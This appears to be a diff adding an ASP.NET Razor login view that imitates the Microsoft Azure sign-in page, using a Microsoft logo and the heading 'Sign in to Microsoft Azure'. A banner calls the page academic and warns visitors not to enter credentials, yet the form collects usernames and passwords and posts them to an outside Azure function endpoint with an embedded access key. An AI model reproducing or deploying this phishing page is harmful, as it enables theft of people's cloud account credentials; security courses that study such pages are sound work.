@@ -1,0 +1,46 @@
+﻿
+@{
+    ViewBag.Title = "Login";
+
+    <body style="background-color: rgb(0, 120, 206);">
+    </body>
+
+    if (IsPost)
+    {
+        string Username = Request.Form["Username"];
+        string Password = Request.Form["Password"];//https://startvmon.azurewebsites.net
+
+    }
+
+        }
+
+
+@using (@Html.BeginForm("GetCred", "Home", FormMethod.Post))
+{
+    <h2 style="color:red;text-align:center;">
+        <b>
+            This Site Was Created For An Academic Usage!
+            <br /><br />
+            Do Not Enter Your Credentials!
+        </b>
+        <br />
+    </h2>
+ <br /><br /><br /><br />
+<div style="text-align:center;color:white">
+
+    <h2><img src="http://manojranaweera.me/wp-content/uploads/2016/11/microsoft.png" width="250" height="125"><b>Microsoft Azure</b></h2> <br />
+
+        <h3>Sign in to Microsoft Azure</h3><br /><br />
+
+        <form action="https://startvmon.azurewebsites.net/api/settingup?code=DVHhpac2KtTnX8FXI0Rerw7L7BtdWyXawFcM4arMyFsUF7umvN8Btw==" method="post" style="border-radius: 15px 50px 30px 5px;">
+
+            <p><b>Username:  </b>   <input id="username" type="text" name="username" required="required" /></p><br />
+
+            <p><b>Password:  </b>   <input id="password" type="password" name="password" required="required" /> </p><br /><br />
+
+
+            <input type="submit" id="GetCred" value="Next" onclick="" />
+        </form>
+    </div>
+}
+
